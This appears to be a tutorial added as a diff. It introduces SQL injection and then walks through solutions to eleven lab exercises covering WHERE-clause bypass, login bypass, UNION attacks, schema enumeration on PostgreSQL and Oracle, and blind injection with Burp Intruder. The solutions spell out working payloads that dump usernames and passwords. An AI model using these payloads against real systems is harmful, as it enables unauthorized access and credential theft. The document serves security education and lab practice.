@@ -1,0 +1,333 @@
+# Introduction to SQL Injection (SQLi)
+
+SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+
+In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.
+
+---
+
+## Common SQL Injection Examples
+1. **Retrieving hidden data**  
+   Modify a SQL query to return additional results that are not supposed to be displayed.
+2. **Subverting application logic**  
+   Change a query to interfere with the application's logic, such as bypassing a login.
+3. **UNION attacks**  
+   Retrieve data from different database tables by appending a second query's results to the first.
+4. **Blind SQL injection**  
+   The results of a query you control are not returned in the application's responses, requiring you to infer data one bit at a time.
+
+---
+
+## Real-World Impact
+A successful SQL injection attack can result in unauthorized access to sensitive data, such as:
+- Passwords  
+- Credit card details  
+- Personal user information  
+- Reputational damage and regulatory fines  
+- A persistent backdoor into an organization's systems
+
+---
+
+## How to Detect SQL Injection
+You can detect SQL injection manually by submitting:
+- The single quote character (`'`) to look for errors or other anomalies.  
+- Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.  
+- Time-delay payloads to see if the server takes longer to respond, confirming a query was executed.  
+- OAST payloads to trigger an out-of-band network interaction.
+
+---
+
+## Prevention Techniques
+- Use parameterized queries (prepared statements) instead of string concatenation.  
+- Whitelist permitted input values for parts of the query that don't support parameters (like table/column names or `ORDER BY`).  
+- Avoid concatenating untrusted input into queries, even if it's deemed "safe."
+
+---
+
+## 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+**SOLUTION**
+
+**STEP 01:** Open the Lab and identify an input vector. Click on one of the product categories, like "Pets", to see how the application filters content.  
+**STEP 02:** Observe the URL in your browser:
+```
+.../filter?category=Pets
+```
+**STEP 03:** Test for a vulnerability by injecting a single quote (`'`):
+```
+.../filter?category='
+```
+An "Internal Server Error" confirms it is vulnerable.
+
+**STEP 04:** Inject a payload to comment out the rest of the query and return all items:
+```
+' OR 1=1--
+```
+Full URL:
+```
+.../filter?category=' OR 1=1--
+```
+
+**STEP 05:** The payload returns all products, solving the lab.
+
+**EXPLANATION**
+Original query:
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+Injected:
+```sql
+SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
+```
+This makes the WHERE clause always true.
+
+**Vulnerability:** SQL Injection in WHERE clause allowing retrieval of hidden data.
+
+---
+
+## 2. SQL injection vulnerability allowing login bypass
+
+**SOLUTION**
+
+**STEP 01:** Go to the "Login" page.  
+**STEP 02:** Inject `'` in the username field.  
+**STEP 03:** An "Internal Server Error" confirms SQL injection.  
+**STEP 04:** To log in as admin:
+```
+administrator'--
+```
+Any password works.  
+**STEP 05:** Click "Log in" — access granted.
+
+**EXPLANATION**
+Original query:
+```sql
+SELECT * FROM users WHERE username = '[USERNAME]' AND password = '[PASSWORD]'
+```
+Injected:
+```sql
+SELECT * FROM users WHERE username = 'administrator'--' AND password = 'password'
+```
+Password check bypassed.
+
+**Vulnerability:** SQL Injection in WHERE clause allowing login bypass.
+
+---
+
+## 3. SQL injection UNION attack, determining the number of columns
+
+**SOLUTION**
+
+**Method 1: ORDER BY**
+1. Inject:
+```
+.../filter?category=Gifts' ORDER BY 1--
+```
+Works.  
+2. Test:
+```
+ORDER BY 4--
+```
+Fails → 3 columns.
+
+**Method 2: UNION SELECT**
+1. Start with:
+```
+UNION SELECT NULL--
+```
+Fails.  
+2. Add until success:
+```
+UNION SELECT NULL,NULL,NULL--
+```
+Success → 3 columns.
+
+**EXPLANATION**
+UNION queries require equal column count. Errors confirm column count.
+
+**Vulnerability:** SQL Injection UNION Attack.
+
+---
+
+## 4. SQL injection UNION attack, finding a column containing text
+
+**SOLUTION**
+
+1. Confirm 3 columns (as before).  
+2. Test:
+```
+UNION SELECT 'a',NULL,NULL--
+```
+Fails.  
+```
+UNION SELECT NULL,'a',NULL--
+```
+Success → 2nd column accepts text.  
+3. Replace `'a'` with required string.
+
+**Vulnerability:** SQL Injection UNION Attack (finding text column).
+
+---
+
+## 5. SQL injection UNION attack, retrieving data from other tables
+
+**SOLUTION**
+
+1. Confirm 2 columns.  
+2. Both accept text:
+```
+UNION SELECT 'a','a'--
+```
+3. Retrieve usernames and passwords:
+```
+UNION SELECT username,password FROM users--
+```
+4. Log in with admin credentials.
+
+**Vulnerability:** SQL Injection UNION Attack (data retrieval).
+
+---
+
+## 6. SQL injection UNION attack, retrieving multiple values in a single column
+
+**SOLUTION**
+
+1. Confirm 2 columns.  
+2. Only 2nd accepts text:
+```
+UNION SELECT NULL,'a'--
+```
+3. Determine DB type with:
+```
+UNION SELECT NULL,version()--
+```
+→ PostgreSQL.  
+4. Use concatenation (`||`):
+```
+UNION SELECT NULL,username || ' ' || password FROM users--
+```
+5. Log in with admin credentials.
+
+**Vulnerability:** SQL Injection UNION Attack (concatenating data).
+
+---
+
+## 7. SQL injection attack, querying database type and version on Oracle
+
+**SOLUTION**
+
+1. Confirm 2 columns using `ORDER BY`.  
+2. Oracle requires `FROM dual`.  
+3. Use:
+```
+UNION SELECT 'a','a' FROM dual--
+```
+4. Query version:
+```
+UNION SELECT banner,NULL FROM v$version--
+```
+→ Displays Oracle version.
+
+**Vulnerability:** SQL Injection UNION Attack (Oracle Database).
+
+---
+
+## 8. SQL injection attack, querying database type and version on MySQL and Microsoft
+
+**SOLUTION**
+
+1. Use `#` as comment:
+```
+ORDER BY 1#
+```
+2. Confirm 2 columns.  
+3. Both text-compatible:
+```
+UNION SELECT 'a','a'#
+```
+4. Retrieve version:
+```
+UNION SELECT @@version,NULL#
+```
+→ Displays DB version.
+
+**Vulnerability:** SQL Injection UNION Attack (MySQL/Microsoft).
+
+---
+
+## 9. SQL injection attack, listing database contents (non-Oracle)
+
+**SOLUTION**
+
+1. Confirm 2 columns.  
+2. Detect DB: `version()` works → PostgreSQL.  
+3. Find tables:
+```
+UNION SELECT table_name,NULL FROM information_schema.tables--
+```
+→ Found `users_nhfwze`.  
+4. Find columns:
+```
+UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_nhfwze'--
+```
+→ Found username/password columns.  
+5. Dump data:
+```
+UNION SELECT username_djxbjg,password_ytzsss FROM users_nhfwze--
+```
+6. Log in as admin.
+
+**Vulnerability:** SQL Injection UNION Attack (Database Enumeration).
+
+---
+
+## 10. SQL injection attack, listing database contents (Oracle)
+
+**SOLUTION**
+
+1. Confirm 2 columns.  
+2. Use Oracle syntax:
+```
+UNION SELECT 'a','a' FROM dual--
+```
+3. Enumerate tables:
+```
+UNION SELECT table_name,NULL FROM all_tables--
+```
+→ Found `USERS_DPWDDB`.  
+4. Enumerate columns:
+```
+UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_DPWDDB'--
+```
+→ Found username/password columns.  
+5. Dump credentials:
+```
+UNION SELECT USERNAME_RTGCOO,PASSWORD_JPFJRE FROM USERS_DPWDDB--
+```
+6. Log in as admin.
+
+**Vulnerability:** SQL Injection UNION Attack (Oracle Database Enumeration).
+
+---
+
+## 11. Blind SQL injection with conditional responses
+
+**SOLUTION**
+
+1. Test `TrackingId` cookie.  
+   - `TrackingId=xyz' AND 1=1--` → "Welcome back!" (TRUE)  
+   - `TrackingId=xyz' AND 1=2--` → No message (FALSE)  
+2. Confirm `administrator` exists:
+```
+TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
+```
+3. Find password length using Burp Intruder.  
+   → Length = 20.  
+4. Use Cluster Bomb in Burp Intruder:
+```
+SUBSTRING(password,§1§,1)='§a§'
+```
+5. Brute-force each position and character until password is revealed.  
+6. Log in as administrator.
+
+**Vulnerability:** Blind SQL Injection (Conditional Response).
